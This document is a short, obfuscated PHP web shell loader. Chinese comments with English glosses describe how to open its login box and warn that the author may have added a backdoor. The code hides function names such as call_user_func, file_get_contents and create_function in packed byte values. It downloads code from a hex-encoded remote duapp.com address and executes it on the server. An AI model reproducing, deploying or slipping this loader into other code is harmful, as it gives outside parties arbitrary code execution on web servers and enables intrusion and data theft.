<?php
session_start();
ini_set('memory_limit',-1);
//**********************************
//不保证作者加后门 (
Does not guarantee the author plus back door)
//请自行甄别 (
Please identify yourself)
//使用方法：打开shell地址后按“p”键，之后会出现登录框 (
How to use: Open the shell address and press the "p" key. The login box will appear.)
//http://require.duapp.com/session.php
//**********************************
//自定义密码 不设置默认密码为demo
//define('pass','123456');
$i = pack('c*', 0x70, 0x61, 99, 107);
$GLOBALS = array(
    'p' => pack('c*', 0x70, 0x61, 99, 107),
    'c' => $i('c*', 99, 97, 108, 108, 95, 117, 115, 101, 114, 95, 102, 117, 110, 99),
    'f' => $i('c*', 102, 105, 108, 101, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115),
    'e' => $i('c*',0x63,0x72,0x65,0x61,0x74,0x65,0x5f,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e),
    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631'),
    's' =>$i('c*',0x73,0x70,0x72,0x69,0x6e,0x74,0x66)
);
if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}
$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSION['t']))));
?>
